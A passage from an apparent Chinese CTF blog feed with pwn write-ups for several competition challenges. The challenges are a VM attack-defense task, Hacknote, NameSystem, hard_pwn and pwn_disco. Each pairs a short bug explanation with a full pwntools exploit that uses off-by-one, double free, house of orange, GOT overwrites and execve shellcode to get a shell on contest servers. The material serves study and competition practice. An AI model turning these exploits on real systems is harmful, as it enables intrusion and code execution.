class="params">()</span>:</span></span><br><span class="line">    script=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x80489A3</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(p,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">play</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movimm</span><span class="params">(reg,imm)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x03'</span>+p8(reg)+p32(imm)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putchar</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x01'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getchar</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x10'</span>+<span class="string">'\x00'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addreg</span><span class="params">(reg)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x20'</span>+p8(reg)</span><br><span class="line"></span><br><span class="line">payload=movimm(<span class="number">3</span>,<span class="number">0x0804B014</span>)+putchar()+addreg(<span class="number">3</span>)+putchar()+addreg(<span class="number">3</span>)+putchar()+addreg(<span class="number">3</span>)+putchar()</span><br><span class="line">payload+=<span class="string">'\xb0'</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">new(payload)</span><br><span class="line">play()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">printf_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">free()</span><br><span class="line">libc=LibcSearcher(<span class="string">"printf"</span>,printf_addr)</span><br><span class="line">system_addr=printf_addr-libc.dump(<span class="string">"printf"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">payload=movimm(<span class="number">0</span>,u32(<span class="string">'sh\x00\x00'</span>))+movimm(<span class="number">3</span>,<span class="number">0x804B018</span>)+getchar()+addreg(<span class="number">3</span>)+getchar()+addreg(<span class="number">3</span>)+getchar()+addreg(<span class="number">3</span>)+getchar()+<span class="string">'\xb0'</span></span><br><span class="line">new(payload)</span><br><span class="line">play()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(p32(system_addr)[<span class="number">0</span>])</span><br><span class="line">p.send(p32(system_addr)[<span class="number">1</span>])</span><br><span class="line">p.send(p32(system_addr)[<span class="number">2</span>])</span><br><span class="line">p.send(p32(system_addr)[<span class="number">3</span>])</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>关于怎么防守，说实话，我是没怎么想清楚怎么去防守。因为利用点太多了，真的很困难。</p><h2><span id="0x03-粤湾证券">0x03 粤湾证券</span></h2><p>这道题是一个攻守兼备的一个VM，根据他提供的VM 来进行逆向分析他的指令集，然后再通过你提供的defense脚本和payload来进行一个攻守兼备的一个模式。</p><p>首先看一下这一题开启的保护</p><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>这一道题很无脑，因为它调用了dlsym,通过这个函数可以直接调用system。不过当时在现场不太了解这个函数，并且没有外网环境，并不知道这个函数用法。对这个函数进行盲测花了很长时间导致其他题没时间做了。这个函数把libc当做handle,第二参数为函数名称的字符串，就会返回函数的真实地址。所以这道题一点都不难，不过可惜在于当时一直以为是函数在libc的偏移量作为函数第二个参数，返回函数真实地址。</p><p>我的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./pwn2"</span>)</span><br><span class="line"><span class="comment">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line"><span class="comment">#p=remote("172.16.9.41",9002)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(code)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Give me code:"</span>,base64.b64encode(code))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"gift:0x"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">gift=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">"gift====&gt;0x%x"</span>%gift)</span><br><span class="line">code=p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(gift+<span class="number">0x0001B3E9A</span>)+p64(<span class="number">0x40</span>)+p64(u64(<span class="string">'system'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))+p64(gift+<span class="number">0x0001B3E9A</span>)</span><br><span class="line">new(code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>我的编写defense的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"/defense"</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(p64(<span class="number">0x20</span>)+p64(u64(<span class="string">'system'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))+p64(u64(<span class="string">'system'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))))</span><br></pre></td></tr></table></figure><p>个人觉得，这个题是最好玩的一个题，希望以后的比赛多来点这种题。不是因为简单，而是因为这个题这种攻守兼备的模式。以题目作为媒介，自己编写攻击和防御脚本来进行对抗，这一点我特别喜欢。不像传统的AWD，通过去修改文件，来修复漏洞，那样少了许多攻击灵活性，但是也不像前道VM题攻击的那么灵活，让你修的无法下手，增加了许多防守的稳定性。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近做了vm的pwnt题才发现Vm的pwn题是真的有意思，做vm的关键在于逆向，我的逆向太菜了，逆的太慢了，做题速度直接与逆向速度挂钩，导致就做出来一道题，哭了。随便提一句有的没的，广州是真的好，主办方是我见过最良心的主办方，大气+多金。还有一道关于json的pwn,我实在
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
      <category term="赛题复现" scheme="http://Whali3n51.top/categories/Writeup/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="VMpwn" scheme="http://Whali3n51.top/tags/VMpwn/"/>
    
  </entry>
  
  <entry>
    <title>湖湘杯线上赛pwn_wp</title>
    <link href="http://whali3n51.top/2019/11/11/%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwn_wp/"/>
    <id>http://whali3n51.top/2019/11/11/%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwn_wp/</id>
    <published>2019-11-11T06:14:00.000Z</published>
    <updated>2020-03-29T13:54:47.641Z</updated>
    
    <content type="html"><![CDATA[<p>难度刚刚好，我能做出来，但是又不是那么容易做出来。最后可惜，没能进线下，ak了pwn也无济于事。</p><h2><span id="0x01-hacknote">0x01 Hacknote</span></h2><p>静态编译的一个题，没开pie，没开nx,可以getshell，漏洞就是off-by-one,比赛的时候巨鸡儿坑，坑死我了，第一次的附件chunk是存在bss段的,然后我就想了个简单的办法，直接用unlink的方式做，但是尼玛服务器上面的程序chunk指针不是在bss段上，而是在栈上。当我发现的时候我简直无语了。最后附件更新四五次，浪费我大量时间在这上面。最后getshell的办法就是利用off-by-one造成堆块重叠，利用fast bin attack，攻击malloc_hook,攻击的时候，修改malloc_hook指向malloc_hook地址的随后的八个字节，修改的同时，在malloc_hook后面写上shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./HackNote")</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.62"</span>,<span class="number">16804</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"-----------------\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the Size:\n"</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">"Input the Note:\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"-----------------\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the Index of Note:\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"-----------------\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the Index of Note:\n"</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">"Input the Note:\n"</span>,content)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x88</span>,<span class="string">'a'</span>*<span class="number">0x1</span>+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0xf8</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x270</span>)+<span class="string">'\x90'</span></span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x6cb772</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">'a'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">'aaaaaa'</span>+p64(<span class="number">0x6cb790</span>)+<span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span>+<span class="string">'\x00\n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"-----------------\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the Size:\n"</span>,str(<span class="number">23</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x02-namesystem">0x02 NameSystem</span></h2><p>这个题的漏洞如果不仔细看，是真的看不出来，在free的时候，将当前chunk指针清零，并将后面指针往迁移。如果粗略的看，这样是没有什么问题的。但是仔细思考，当我们堆块为满的时候，前面任何一个chunk的指针被清零后，最后的一个chunk会赋值前移，造成的效果就是第19和第20个的chunk值一模一样，这样就造成悬挂指针，也就是可以double free了。getshell的主要思路就是攻击got表和存放chunk指针的bss段来泄露lib和getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./NameSystem"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./NameSystem"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="comment">#p=remote("183.129.189.62",21305)</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Name Size:"</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">"Name:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"The id you want to delete:"</span>,str(index))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">create(<span class="number">0x50</span>,p64(<span class="number">0x601ffa</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x50</span>,p64(<span class="number">0x601ffa</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x50</span>,p64(<span class="number">0x601ffa</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">17</span>):</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x60</span>,p64(<span class="number">0x60208d</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x60</span>,p64(<span class="number">0x60208d</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x60</span>,p64(<span class="number">0x60208d</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'aaa'</span>+p64(<span class="number">0x602080</span>)+p64(<span class="number">0x000000000060200a</span>)+<span class="string">'\n'</span>)</span><br><span class="line">onegad=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaaaa'</span>+p64(<span class="number">0x41</span>)+p64(elf.symbols[<span class="string">'puts'</span>])[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">stdout=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base=stdout-(<span class="number">0x00007ffff7dd2620</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">success(<span class="string">"libc====&gt;0x%x"</span>%libc_base)</span><br><span class="line">pause()</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">create(<span class="number">0x30</span>,p64(<span class="number">0x602008</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x30</span>,p64(<span class="number">0x602008</span>)+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x30</span>,p64(system)[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">'\n'</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;难度刚刚好，我能做出来，但是又不是那么容易做出来。最后可惜，没能进线下，ak了pwn也无济于事。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&quot;0x01-hacknote&quot;&gt;0x01 Hacknote&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;静态编译的一个题，没开pie，没开nx,可以getsh
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="double free" scheme="http://Whali3n51.top/tags/double-free/"/>
    
      <category term="shellcode" scheme="http://Whali3n51.top/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>HECTF_Pwn_wp</title>
    <link href="http://whali3n51.top/2019/11/11/HECTF/"/>
    <id>http://whali3n51.top/2019/11/11/HECTF/</id>
    <published>2019-11-11T05:51:00.000Z</published>
    <updated>2020-01-08T06:52:44.102Z</updated>
    
    <content type="html"><![CDATA[<p>这个比赛我没怎么玩，主要是比赛当天有事，据说是新手向的题目，是河北师范大学举办的比赛，我只做了里面几道题。</p><h2><span id="0x01-hard_pwn">0x01 hard_pwn</span></h2><p>就存在一个off-by-one，可以直接解造成堆块重叠，进而使用house of orange来getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">':'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,<span class="string">"4"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">': '</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./hard_pwn")</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10026</span>)</span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,<span class="number">0xf0</span>*<span class="string">'a'</span>+p64(<span class="number">0x1a0</span>)+p64(<span class="number">0xa0</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x90</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"You play is "</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x00007ffff7dd1b78</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">success(<span class="string">"libc_base=====&gt;0x%x"</span>%libc_base)</span><br><span class="line">pause()</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0xa0</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+fake_file)</span><br><span class="line">fake_file=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file+=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x18cd57</span>)</span><br><span class="line">fake_file=fake_file.ljust(<span class="number">0xc8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">fake_file+=p64(libc_base+<span class="number">0x3c37a0</span><span class="number">-8</span>)</span><br><span class="line">fake_file+=p64(<span class="number">0</span>)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,fake_file)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x02-pwn_disco">0x02 pwn_disco</span></h2><p>说实话本题画风还是挺搞笑的，运行程序的时候我笑了好久。存在漏洞有两个，让这一题变得简单起来，一个是格式化字符串，直接可以泄露出libc基址出来，另一个是UAF,当free堆块之后,存在悬挂指针，直接攻击__malloc_hook然后修改为one_gadget来getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="comment">#p=process('./pwn_disco')</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your Choice:'</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line">p.sendafter(<span class="string">'color:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span 